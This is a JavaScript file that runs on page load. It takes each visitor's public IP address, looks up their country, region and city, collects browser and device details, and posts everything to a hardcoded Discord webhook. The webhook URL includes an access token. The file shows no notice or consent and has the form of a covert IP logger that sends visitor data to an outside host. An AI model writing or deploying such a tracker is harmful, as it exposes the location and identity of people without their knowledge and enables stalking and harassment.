function getDeviceDetails() {
  const details = {
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    screenWidth: window.screen.width,
    screenHeight: window.screen.height,
    colorDepth: window.screen.colorDepth,
    pixelDepth: window.screen.pixelDepth,
    online: navigator.onLine,
    isMobile: /Mobi|Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent),
    isTouchDevice: 'ontouchstart' in window || navigator.maxTouchPoints > 0
  };
  return Promise.resolve(details);
}

function sendToWebhook(webhookUrl, data) {
  return fetch(webhookUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({ embeds: [data] })
  });
}

async function collectAndSend() {
  const webhookUrl = 'https://discord.com/api/webhooks/1395181313798967368/HSwiokDDopSK6vteiEOq_c2SuCPTsln9UewDS9IYMXnK68pMNuEzXghcfg3VArDCT19L';
  
  try {
    const ipResponse = await fetch('https://api.ipify.org?format=json');
    const ipData = await ipResponse.json();
    
    const ipInfoResponse = await fetch(`https://ipinfo.io/${ipData.ip}/json`);
    const ipInfo = await ipInfoResponse.json();
    
    const deviceDetails = await getDeviceDetails();
    
    const embed = {
      title: "Device Information",
      description: `IP Address: ${ipData.ip}`,
      fields: [
        { name: "Country", value: ipInfo.country, inline: true },
        { name: "Region", value: ipInfo.region, inline: true },
        { name: "City", value: ipInfo.city, inline: true },
        { name: "User Agent", value: deviceDetails.userAgent, inline: false },
        { name: "Platform", value: deviceDetails.platform, inline: true },
        { name: "Language", value: deviceDetails.language, inline: true },
        { name: "Screen Resolution", value: `${deviceDetails.screenWidth}x${deviceDetails.screenHeight}`, inline: true },
        { name: "Color Depth", value: deviceDetails.colorDepth.toString(), inline: true },
        { name: "Pixel Depth", value: deviceDetails.pixelDepth.toString(), inline: true },
        { name: "Online", value: deviceDetails.online.toString(), inline: true },
        { name: "Is Mobile", value: deviceDetails.isMobile.toString(), inline: true },
        { name: "Is Touch Device", value: deviceDetails.isTouchDevice.toString(), inline: true }
      ]
    };

    await sendToWebhook(webhookUrl, embed);
    console.log('Data sent successfully');
  } catch (error) {
    console.error('Error:', error);
  }
}

// Start collection when document is ready
document.addEventListener('DOMContentLoaded', collectAndSend);

